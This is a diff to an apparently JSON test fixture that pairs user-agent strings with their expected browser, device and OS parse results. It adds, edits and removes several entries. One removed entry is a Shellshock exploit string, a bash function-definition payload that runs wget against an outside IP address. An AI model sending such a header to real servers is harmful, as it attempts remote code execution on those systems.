@@ -1483,6 +1483,44 @@
   },
   {
     "headers": {
+      "user-agent": "Mozilla/5.0 (000000000; 00000 000 00 0 0000000) DDDDDDDDDDDDDDDDDDDD DDDDDDD DDDD DDDDDD DDDDDDDDDDD DDDDDDDDDDDDDDD"
+    },
+    "device": {
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown"
+    },
+    "browser": {
+      "name": "Mozilla",
+      "modus": null,
+      "version": "000000000.0.0",
+      "manufacturer": "mozilla-foundation",
+      "bits": null,
+      "type": "browser"
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "bits": null
+    },
+    "engine": {
+      "name": "Gecko",
+      "version": null,
+      "manufacturer": "mozilla-foundation"
+    }
+  },
+  {
+    "headers": {
       "user-agent": "python-requests/0.12.1"
     },
     "device": {
@@ -1805,7 +1843,7 @@
     "browser": {
       "name": "Dolphin smalltalk http client",
       "modus": null,
-      "version": "11.4.3",
+      "version": "11.4.3.445",
       "manufacturer": "steve-waring",
       "bits": null,
       "type": "bot"
@@ -2793,7 +2831,7 @@
     "browser": {
       "name": "Dolphin smalltalk http client",
       "modus": null,
-      "version": "11.2.3",
+      "version": "11.2.3.369",
       "manufacturer": "steve-waring",
       "bits": null,
       "type": "bot"
@@ -3061,6 +3099,44 @@
       "modus": null,
       "version": "1.1.0",
       "manufacturer": "unknown",
+      "bits": null,
+      "type": "bot"
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "bits": null
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "BuiBui-Bot/1.0 (3m4il: buibui[dot]bot[\\xc3\\xa07]moquadv[dot]com)"
+    },
+    "device": {
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown"
+    },
+    "browser": {
+      "name": "BuiBui-Bot",
+      "modus": null,
+      "version": "3.0.0",
+      "manufacturer": "dadapro",
       "bits": null,
       "type": "bot"
     },
@@ -3721,82 +3797,6 @@
       "name": "Edge",
       "version": "14.9200.0",
       "manufacturer": "microsoft"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "() { :; }; /bin/bash -c 'wget http://176.126.85.127:8080/megatron1 -O /dev/null'"
-    },
-    "device": {
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown"
-    },
-    "browser": {
-      "name": "wget",
-      "modus": null,
-      "version": null,
-      "manufacturer": "free-software-foundation",
-      "bits": null,
-      "type": "offline-browser"
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": null
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "Firefox/41.0.1 (x86 de); anonymized by Abelssoft 1663170808"
-    },
-    "device": {
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown"
-    },
-    "browser": {
-      "name": "Firefox",
-      "modus": null,
-      "version": "41.0.1",
-      "manufacturer": "mozilla-foundation",
-      "bits": null,
-      "type": "browser"
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": null
-    },
-    "engine": {
-      "name": "Gecko",
-      "version": null,
-      "manufacturer": "mozilla-foundation"
     }
   }
 ]
